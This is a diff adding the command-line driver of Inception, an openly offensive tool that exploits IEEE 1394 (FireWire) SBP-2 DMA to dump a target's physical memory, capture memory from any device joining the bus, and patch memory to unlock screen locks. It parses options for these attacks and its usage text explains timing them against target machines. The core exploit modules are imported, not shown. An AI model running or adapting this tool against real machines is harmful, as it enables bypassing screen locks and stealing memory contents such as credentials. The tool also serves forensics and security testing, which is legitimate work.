@@ -1,0 +1,241 @@
+#!/opt/local/Library/Frameworks/Python.framework/Versions/3.2/Resources/Python.app/Contents/MacOS/Python
+'''
+Inception - a FireWire physical memory manipulation and hacking tool exploiting
+IEEE 1394 SBP-2 DMA.
+
+Copyright (C) 2012  Carsten Maartmann-Moe
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+Created on Oct 15, 2011
+
+@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
+'''
+
+from inception import screenlock, memdump, pickpocket
+from inception.firewire import FireWire
+from inception.util import msg, fail, separator, detectos, unloadIOFireWireIP
+import inception.settings as settings
+import getopt
+import os
+import sys
+import traceback
+from datetime import time, date
+import pprint
+
+
+def main(argv):
+    settings.encoding = sys.getdefaultencoding()
+    
+    # Print obligatory awesome ASCII banner
+    print('''
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+ _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+ _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+ _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
+
+v.{0} (C) Carsten Maartmann-Moe {1}
+Download: {2} | Twitter: @breaknenter
+'''.format(settings.version, date.today().strftime("%Y"), settings.url))
+    
+    # Initialize
+    targets = settings.targets
+    
+    # Detect host OS
+    settings.os = detectos()
+    
+    # Parse args
+    try:
+        opts, args = getopt.getopt(argv[1:], 'bd:Df:hlvw:npum:', 
+                                   ['businfo', 'dump=', 'dump-all', 'file=', 'force-write', 'help', 'list', 'verbose', 'wait=', 'no-write', 'pickpocket', 'unload', 'manual='])
+    except getopt.GetoptError as err:
+        msg('!', err)
+        usage(argv[0])
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt in ('-h', '--help'):
+            usage(argv[0])
+            sys.exit()
+        elif opt in ('-f', '--file'):
+            settings.filemode = True
+            settings.filename = str(arg)
+        elif opt in ('--force-write'):
+            settings.forcewrite = True
+        elif opt in ('-l', '--list'):
+            msg('*', 'Available targets:')
+            separator()
+            for n, target in enumerate(targets, 1):
+                msg(n, target['OS'] + ': ' + target['name'])
+            separator()
+            sys.exit()
+        elif opt in ('-v', '--verbose'):
+            settings.verbose = True
+        elif opt in ('-w', '--wait'):
+            settings.fw_delay = int(arg)
+        elif opt in ('-n', '--no-write'):
+            settings.dry_run = True
+        elif opt in ('-D', '--dump-all'):
+            settings.memdump = True
+            start = settings.startaddress
+            end = settings.memsize
+        elif opt in ('-d', '--dump'):
+            settings.memdump = True
+            try:
+                start, size = str(arg).split(',')
+                # Fix start
+                if '0x' in start:
+                    start = int(start, 0) & 0xfffff000 # Address
+                else:
+                    start = int(start) * settings.PAGESIZE # Page number
+                # If the start address is below 1 MiB, the user is overriding
+                # default behavior (avoiding memory below 1 MiB)
+                if start < settings.startaddress:
+                    settings.override = True
+                    msg('*', 'Overriding default behavior, accessing memory below 1 MiB')
+                # Fix size
+                size = size.lower()
+                if size.find('kib') != -1 or size.find('kb') != -1:
+                    size = int(size.rstrip(' kib')) * settings.KiB
+                elif size.find('mib') != -1 or size.find('mb') != -1:
+                    size = int(size.rstrip(' mib')) * settings.MiB
+                elif size.find('gib') != -1 or size.find('gb') != -1:
+                    size = int(size.rstrip(' gib')) * settings.GiB
+                else:
+                    size = int(size) * settings.PAGESIZE
+                if size < settings.PAGESIZE:
+                    msg('!', 'Minimum dump size is a page, {0} KiB'.format(settings.PAGESIZE // settings.KiB))
+                end = start + size
+            except:
+                fail('Could not parse argument to {0}'.format(opt))
+        elif opt in ('-i', '--interactive'):
+            settings.interactive = True
+            # TODO: Implement interactive mode
+            fail("Option not implemented yet, sorry")
+        elif opt in ('-b', '--businfo'):
+            fw = FireWire()
+            fw.businfo()
+            sys.exit()
+        elif opt in ('-p', '--pickpocket'):
+            settings.pickpocket = True
+        elif opt in ('-u', '--unload'):
+            if settings.os == settings.OSX:
+                unloadIOFireWireIP()
+            else:
+                fail('Host system is not OS X, aborting')
+            sys.exit()
+        elif opt in ('-m', '--manual'):
+            try:
+                offset, signature, patch = str(arg).split(',')
+                offset = int(offset, 0)
+                signature = int(signature, 0)
+                patch = int(patch, 0)
+            except ValueError:
+                fail('You must provide a valid offset, signature and patch in manual mode')
+            targets = [{'OS': 'Non-specified OS',
+                        'versions': ['N/A'],
+                        'architectures': ['N/A'],
+                        'name': 'Manual patch',
+                        'notes': 'N/A',
+                        'signatures': [{'offsets': [offset],
+                                        'chunks': [{'chunk': signature,
+                                                    'internaloffset': 0x00,
+                                                    'patch': patch,
+                                                    'patchoffset': 0x00}]}]}]
+        else:
+            assert False, 'Option not handled: ' + opt
+    
+    # We don't accept any other arguments
+    if args:
+        msg('!', 'Arguments {0} ignored'.format(', '.join(args)))
+    
+    if not settings.filemode and not os.geteuid() == 0:
+        fail("You must be root to run Inception with FireWire input")
+        
+    # Here we go
+    try:
+        if settings.memdump:
+            memdump.dump(start, end)
+        elif settings.pickpocket:
+            if settings.filemode:
+                fail("Pickpocket mode is not compatible with file mode")
+            pickpocket.lurk()
+        else:
+            address, page = screenlock.attack(targets)
+            if not address or not page:
+                fail('Could not locate signature(s).')
+    except Exception as exc:
+        msg('!', 'Um, something went wrong: {0}'.format(exc))
+        separator()
+        traceback.print_exc()
+        separator()
+    except KeyboardInterrupt:
+        msg('!', 'Aborted')
+
+
+def usage(execname):
+    print('''Inception is a FireWire physical memory manipulation and hacking tool exploiting
+IEEE 1394 SBP-2 DMA.
+
+Usage: ''' + os.path.basename(execname) + ''' [OPTIONS]
+
+Options:
+    -d, --dump=ADDRESS,PAGES:
+                          Non-intrusive memory dump. Dumps PAGES of memory
+                          content from ADDRESS page. Memory content is dumped to 
+                          files with the file name syntax:
+                          'memdump_START-END.bin'. ADDR can be a page number or 
+                          a hexadecimal address within a page. PAGES can be a
+                          number of pages or a size of data using the
+                          denomination KiB, MiB or GiB. Example: -d 0x00ff,5MiB
+                          This command dumps the first 5 MiB of memory after 
+                          0x00ff.
+    -D                    Same as -d, but dumps all available memory. Note that
+                          due to unreliable behavior on some targets when
+                          accessing data below 1 MiB, this command will start
+                          dumping at the 1 MiB physical address (0x100000). To 
+                          override, use the -d switch (e.g., -d 0x00,256MiB).
+    -f, --file=FILE:      Use a file instead of FireWire bus data as input; for
+                          example to facilitate attacks on VMware machine memory
+                          files (.vmem) and to ease testing and signature 
+                          creation efforts.
+    --force-write         Forces patching when using files as input (see -f). By
+                          default, Inception does not write back to data files.
+    -h, --help:           Displays this message.
+    -l, --list:           Lists configured operating system targets.
+    -m, --manual=OFFSET,SIGNATURE,PATCH:
+                          Specify a patch manually. Enables easy testing of new
+                          signatures; to use provide a comma-separated list of
+                          an offset, a signature and a patch as integers or
+                          in a hexadecimal format (prepended by '0x').
+    -n, --no-write:       Dry run, do not write back to memory.
+    -p, --pickpocket:     Dump the physical memory of any device that connects
+                          to the FireWire bus. This may be useful when
+                          exploiting a Daisy chain.
+    -u, --unload          OS X only: Unloads IOFireWireIP.kext (OS X IP over
+                          FireWire module) which are known to cause kernel
+                          panics when the host (attacking system) is OS X. Must
+                          be executed BEFORE any FireWire devices are connected
+                          to the host.
+    -v, --verbose:        Verbose mode - among other things, this prints read 
+                          data to stdout, useful for debugging.
+    -w, --wait=TIME:      Delay attack by TIME seconds. This is useful in order
+                          to guarantee that the target machine has successfully
+                          granted the host DMA before attacking. If the
+                          attack fails, try to increase this value. Default
+                          delay is 15 seconds.''')
+
+
+if __name__ == '__main__':
+    main(sys.argv)
